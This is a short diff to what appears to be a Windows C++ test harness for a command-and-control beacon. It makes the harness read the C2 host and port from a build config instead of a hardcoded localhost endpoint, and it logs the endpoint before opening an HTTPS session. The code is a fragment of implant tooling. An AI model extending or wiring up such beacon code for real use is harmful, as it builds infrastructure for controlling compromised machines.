@@ -14,10 +14,15 @@ int main() {
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { printf("WSA fail\n"); return 1; }
     net::C2Config cfg;
     cfg.beacon_id = BEACON_AUTH_ID;
-    cfg.host = L"127.0.0.1";
-    cfg.port = 8443;
+    // Follow the BUILD config (c2_config.h) instead of hardcoded values:
+    // a harness pinned to 127.0.0.1:8443 could never exercise the endpoint a
+    // real build was generated for (live 2026-10-17: the listener ran on
+    // 127.0.0.1:9443 and the harness dialed a port nobody served).
+    cfg.host = L"" C2_HOST;
+    cfg.port = C2_PORT;
     cfg.use_https = true;
-    printf("[*] beacon_id=%s fingerprint=%.16s...\n", cfg.beacon_id.c_str(), BEACON_SERVER_FINGERPRINT);
+    printf("[*] beacon_id=%s host=%s port=%d fingerprint=%.16s...\n",
+           cfg.beacon_id.c_str(), C2_HOST, C2_PORT, BEACON_SERVER_FINGERPRINT);
 
     if (!net::g_ctx.ensure(cfg)) { printf("[!] ctx.ensure FAILED\n"); return 1; }
     printf("[+] ctx.ensure OK (session+connect)\n");
